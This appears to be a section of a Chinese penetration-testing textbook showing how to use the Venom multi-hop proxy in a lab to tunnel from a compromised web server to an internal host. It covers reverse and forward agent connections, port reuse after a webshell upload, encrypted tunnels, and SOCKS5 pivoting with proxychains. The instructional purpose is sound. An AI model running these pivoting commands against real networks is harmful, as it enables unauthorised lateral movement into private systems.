


### 3.5.2 通过Venom进行隧道穿透
Venom工具也被称为“毒液工具”，它是一款开源的多级代理工具，使用Go语言开发，支持多种平台。Venom可以将多个节点进行连接，并以节点为跳板构建多级代理搭建网络隧道，渗透测试人员可以使用Venom轻松地将网络流量代理到多层内网管理代理节点，利用"毒液"进行可视化网络拓扑、多级Socks5代理、多级端口转发、端口复用（Apache、Mysql等服务）、SSH隧道、交互式Shell、文件的上传和下载、节点间通信加密等。<br />假设当我们拿下一台Web服务器通过提权获得到Administrator权限，对目标主机信息收集，进行搭建隧道便于后续渗透。此时利用venom工具进行搭建隧道，使用venom工具中Admin服务端进行本地监听，Agent作为客户端在目标主机发起连接。本次实验环境如图3-163所示，本次实验环境表如表3-15所示。<br />![](https://cdn.nlark.com/yuque/0/2023/png/1137595/1699683864757-8646ceb7-94d3-43c5-a50b-964e622b043e.png#)<br />图3-163通过Venom进行隧道穿透实验拓扑图<br />表3-15 通过Venom进行隧道穿透实验环境表

| 主机类型 | IP配置 |
| --- | --- |
| 攻击机 | 192.168.0.58 |
| Web服务器 | 192.168.0.25，192.168.52.2 |
| 靶机 | 192.168.52.3 |


#### 1.基础使用
    Venom工具支持多款操作系统，它可以跨平台使用，主要是由Admin服务端和Agent客户端组成，作为本地监听连接和主动发起连接使用，下面从Venom工具的基础功能进行讲解，再以正向连接和反向连接为案例进行演示。
##### （1）反向监听
1）首先在攻击机配置，使用venom工具开启服务端监听，执行admin.exe -lport 8888命令，其中的-lport参数指的是监听本地端口，这里指监听本地8888端口，执行结果如图3-164所示。<br />![](https://cdn.nlark.com/yuque/0/2023/png/1137595/1699683865184-846ddaff-aad2-405a-b10c-89dbf89a36a9.png#)<br />图3-164监听本地端口<br />   2）然后我们通过上传agent客户端到Web服务器，执行agent.exe -rhost 192.168.0.58 -rport 8888命令，让Web服务器主动发起连接攻击机开启的监听，建立起隧道通讯，执行成功如图3-165所示。<br />![](https://cdn.nlark.com/yuque/0/2023/png/1137595/1699683865569-9cf7d24d-9aca-4d20-ab42-ca483d67892c.png#)<br />图3-165隧道通讯<br />   3）此时服务端会接收建立隧道信息，使用show命令可以显示网络拓扑，如图3-166所示。<br />![](https://cdn.nlark.com/yuque/0/2023/png/1137595/1699683865820-de39deb1-7232-4868-a61b-aaf1dc65dd6c.png#)<br />图3-166查看隧道信息
##### （2）正向监听
和上述使用场景类似，当拿下Web服务器权限后，通过探测发现Web服务器不出网，但能正常访问主机，可以使用venom工具以正向连接的方式搭建隧道进行渗透。<br />1）上传Agent文件到Web服务器，执行agent.exe -lport 8888命令开启客户端监听。如图3-167所示。<br />![](https://cdn.nlark.com/yuque/0/2023/png/1137595/1699683866125-1e7cd0cb-d886-41bb-a2d4-3837dade3a9c.png#)<br />图3-167开启目标主机监听<br />    2）然后在攻击机使用Admin服务端发起连接，执行admin.exe -rhost 192.168.0.25 -rport 8888建立隧道通讯，其中-rhost参数指向远程连接ip，-rport参数指连接的端口。如图3-168所示。<br />![](https://cdn.nlark.com/yuque/0/2023/png/1137595/1699683866368-cdace688-1395-4610-8604-e0184c33eb3d.png#)<br />图3-168建立隧道通讯<br />    3）接下来在攻击机使用show命令验证，可以看到隧道建立成功，如图3-169所示。<br />![](https://cdn.nlark.com/yuque/0/2023/png/1137595/1699683866643-fa4f96a1-febf-41f0-b228-eff9fbb4bfa3.png#)<br />图3-169隧道搭建成功
##### （3）端口复用
1）假设上传webshell后，Web服务器只有80端口的开放http服务可以利用，下面我们通过venom工具的SO_REUSEPORT"和"SO_REUSEADDR选项进行端口复用，Windows服务器下复用apache中间件的http服务80端口，不影响正常使用。<br />2）上传 agent文件到Web服务器，执行agent.exe -lhost 192.168.0.25 -reuse-port 80命令，设置80端口的复用，如图3-170所示。<br />![](https://cdn.nlark.com/yuque/0/2023/png/1137595/1699683866906-3ca649d2-f002-4bea-a79b-eb2e6ca794ab.png#)<br />图3-170上传agent<br />    3）在攻击机使用admin服务端执行admin.exe -rhost 192.168.0.25 -rport 80命令，来进行端口复用，如图3-171所示。<br />![](https://cdn.nlark.com/yuque/0/2023/png/1137595/1699683867148-1f5856aa-f37d-43e5-98d4-79318f1413fc.png#)<br />图3-171端口复用
##### （4）节点间通信加密
1）在节点通讯请求和响应的过程中，如果消息中途被劫持或篡改后果不堪设想，而我们的Venom工具支持隧道通信加密，对通讯数据进行加密保护，本地通过-passwd参数选项指定密码进行设置，密码用于生成AES加密所需的密钥，下面来演示通过-passwd参数指定密码为Admin123.，在攻击机使用venom工具服务端执行admin.exe -lport 8888 -passwd Admin123.命令，为隧道进行加密。如图3-172所示。<br />![](https://cdn.nlark.com/yuque/0/2023/png/1137595/1699683867400-f6d67cfe-5ba8-4816-9f82-46059c2a33bd.png#)<br />图3-172隧道加密<br />    2）我们在Web服务器使用venom工具客户端agent文件，指定相同的密码与服务端admin连接，执行agent -rhost 192.168.0.58 -rport 8888 -passwd Admin123. 命令，执行成功即可达到隧道节点通讯加密的效果，如图3-173所示。<br />![](https://cdn.nlark.com/yuque/0/2023/png/1137595/1699683867647-e089642f-e477-4366-9ecf-555c1536ddd8.png#)<br />图3-173隧道节点通讯加密
#### 2.正向连接
正向连接实验环境如图3-174所示，假设前提是获取到Web服务器管理权限后，可以使用venom工具进行隧道利用，具体实验环境如表3-16所示。<br />![](https://cdn.nlark.com/yuque/0/2023/png/1137595/1699683867898-9db3e612-4dec-4c53-9353-825651da9386.png#)<br />图3-174 实验环境<br />表3-16正向连接实验环境

| 主机类型 | 网络配置 |
| --- | --- |
| 攻击机 | 192.168.0.58 |
| Web服务器 | 192.168.0.25   192.168.52.11 |
| 靶机 | 192.68.52.12 |

1）上传venom工具到Web服务器之后执行agent.exe -lport 8888命令，开启本地客户端监听，我们以正向连接的方式搭建隧道，执行成功如图3-175所示。<br />![](https://cdn.nlark.com/yuque/0/2023/png/1137595/1699683868127-094e5479-ce53-4eab-84a0-6e5e43d03120.png#)<br />图3-175本地监听<br />    2）攻击机使用venom服务端执行./admin -rhost 192.168.0.25 -rport 8888命令进行连接，其中-rhost参数是指设置远程服务器的端口，此时会连接监听，输入show查看连接情况，如果有A---1，证明已经有客户端连接成功，执行如图3-176所示。<br />![](https://cdn.nlark.com/yuque/0/2023/png/1137595/1699683868409-360b00b5-f8a0-4e76-8939-95904b2f6496.png#)<br />图3-176连接成功<br />    3）接下来尝试连接socks隧道，输入goto 1命令连接这个客户端，再输入socks 1024设置socks隧道自定义端口，此时已经配置完成socks隧道，如图3-177所示。<br />![](https://cdn.nlark.com/yuque/0/2023/png/1137595/1699683868689-e73385a3-1604-49ba-a301-05874141191d.png#)<br />图3-177隧道搭建成功<br />  4）随后，在攻击机中修改proxychains4.conf配置文件，并在其底部添加一行socks5127.0.0.1 1024参数来完成 proxychains 代理配置，如图3-178所示。<br />![](https://cdn.nlark.com/yuque/0/2023/png/1137595/1699683868946-d242e1c7-2de7-4f4b-9532-17b75eeef359.png#)<br />图3-178配置socks5代理<br />    5）当配置完proxychains代理后，即可在攻击机执行proxychains rdesktop 192.168.52.12命令来连接靶机，如图3-179 所示，通过所建立的socks协议隧道，我们可以直接远程连接到靶机。<br />![](https://cdn.nlark.com/yuque/0/2023/png/1137595/1699683869315-5522a19d-b77c-4e75-9023-ff9848b125e1.png#)<br />图3-179连接靶机
#### 3.反向连接
1）反向连接方式和上述类似，适用于出网的情况，我们在攻击机开启监听服务端8888端口，执行./admin -lport 8888命令设置开启服务端监听，如图3-180所示。<br />![](https://cdn.nlark.com/yuque/0/2023/png/1137595/1699683869774-fcb0ee35-f424-4d5a-ba03-a8150dbda83b.png#)<br />图3-180 监听8888端口 <br />2）完成后，我们上传客户端agent文件到Web服务器，在WEB 服务器执行agent.exe -rhost 192.168.0.58 -rport 8888，其中远程连接的IP 192.168.0.58，在实战中需要公网IP，成功连接如图3-181所示。<br />![](https://cdn.nlark.com/yuque/0/2023/png/1137595/1699683870014-00bb5cdf-fb50-4141-bc80-58ccd772586e.png#)<br />图3-181成功连接<br />   3）此时已经是搭建好了隧道，输入show查看连接情况，有回显A---1，使用goto 1去连接客户端，使用socks 1024 来搭建socks隧道，执行命令如图3-182所示。<br />![](https://cdn.nlark.com/yuque/0/2023/png/1137595/1699683870320-6cf6b263-c43b-4c32-927a-cb26fa0de514.png#)<br />图3-182搭建socks隧道<br />    4）随后，在攻击机中修改 proxychains4.conf配置文件，并在其底部添加一行socks5127.0.0.1 1024参数来完成proxychains代理配置，如图3-183所示。<br />![](https://cdn.nlark.com/yuque/0/2023/png/1137595/1699683870576-7412657c-ed70-4d01-9c06-2bf97ace9f5e.png#)<br />图3-183配置socks5代理<br />    5）当配置完proxychains代理后，即可在攻击机执行proxychains rdesktop 192.168.52.12命令来连接靶机，如图3-184所示，通过所建立的socks协议隧道，我们可以直接远程连接到靶机。<br />![](https://cdn.nlark.com/yuque/0/2023/png/1137595/1699683870916-f769e2cf-b759-49a8-82b3-59b0f335ad01.png#)<br />图3-184连接靶机

